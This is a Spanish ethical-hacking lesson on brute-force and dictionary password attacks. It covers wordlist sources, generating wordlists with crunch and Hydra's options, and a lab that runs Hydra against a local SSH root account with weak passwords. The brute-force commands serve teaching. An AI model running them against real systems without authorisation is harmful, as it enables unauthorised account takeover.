En esta lección se verá el próximo tipo de ataque de la lista: fuerza bruta, consistente en la prueba de distintas combinaciones de usuarios y contraseñas hasta encontrar aquella que sea satisfactoria.

Existen dos ataques de este tipo: fuerza bruta y ataque por diccionario. Dichos diccionarios pueden conseguirse a través de muchas páginas Web con repositorios de diccionarios de palabras, categorizados por idiomas, dificultad, popularidad… Dichos ficheros pueden descargarse y usarlos en nuestros propios ataques.

Algunas de las webs más populares son:

```
www.skullsecurity.org
www.insidepro.com
www.packetstormsecurity.org
```

##### [](https://openwebinars.net/academia/aprende/ethical-hacking-introduccion/1716/#crunch)CRUNCH

```
https://sourceforge.net/projects/crunch-wordlist
```

Herramienta que se usa para generar nuestro propio diccionario donde se puede especificar el conjunto de caracteres que conformarán dichas palabras. Crunch se encargará de generar todas las posibles combinaciones y permutaciones de dichos caracteres. La sintaxis es simple:

```
crunch min max caracters
```

Min es el número mínimo de caracteres que tendrán las palabras del diccionario y max lo mismo pero máximo. Caracters serán los caracteres que queremos que conformen dichas palabras. Por ejemplo:

```
Crunch 1 3 123: 1, 2, 3, 11, 12, 13, 21, 22, 23, 31, 32, 33, 111, 112, 113, 211, 212, ... 323, 333 
Crunch 2 2 ab12= aa, ab, a1, a2, ba, bb, b1, ... 21, 22
```

De esta forma es fácil generar un diccionario para conseguir justo aquello que necesitemos. Si se sabe que una contraseña va a tener 4 números, sabemos que va a encontrarse en la salida del comando: `crunch 4 4 0123456789`.

##### [](https://openwebinars.net/academia/aprende/ethical-hacking-introduccion/1716/#hydra)HYDRA

```
http://sectools.org/tool/hydra
```

Herramienta que automatiza la prueba de usuarios y contraseñas en una gran variedad de servicios. Es una herramienta muy completa con gran cantidad de parámetros con los que usarla, que se pueden encontrar junto con su descripción lanzando el comando `hydra -h`.  
Los parámetros que se van a utilizar en este ejemplo son los siguientes:

```
-l LOGIN / -L FILE: Establecer el nombre del usuario que se va a utilizar o una 
lista de nombres a probar. 

-p PASS / -P FILE: Contraseña a usar o lista de las mismas (diccionario) que se 
van a probar. 

-f/-F: Terminar la ejecución de programa cuando se encuentre un par usuario/
contraseña válido. 

-s PORT: Especificar el Puerto si éste es distinto al Puerto por defecto. 

-v / -V / -d: Activar el modo debug (depuración) para obtener más información 
sobre la ejecución de la herramienta.  
```

#### [](https://openwebinars.net/academia/aprende/ethical-hacking-introduccion/1716/#laboratorio)LABORATORIO

Ataque por fuerza bruta sobre un servicio SSH para obtener privilegios. Para modificar la contraseña del usuario root, se deberá estar autenticado como ‘root’ y usar  
el comando: `passwd root`

Se establecerá la contraseña `050` para la prueba de Fuerza bruta y `qwerty` para la de Fuerza bruta por diccionario.

Para comprobar si el puerto ssh está disponible se comprobará mediante Nmap:

```
nmap –Pn 127.0.0.1
```

El diccionario para el segundo ejemplo se descargará desde la web pero para el primer ejemplo será necesario generarlo con el comando Crunch:

```
crunch 3 3 0123456789 > pass.txt
```

En el caso del diccionario se ha descargado uno que recoge las 500 peores contraseñas.

En el ataque con Hydra se usarán los dos siguientes comandos:

**_Ejemplo 1:_**

```
hydra 127.0.0.1 ssh -s 22 -l root -P pass.txt -f -vV 
```

**_Ejemplo 2:_**

```
hydra 127.0.0.1 ssh -s 22 -L users -P worstpasswords.txt -f -vV 
```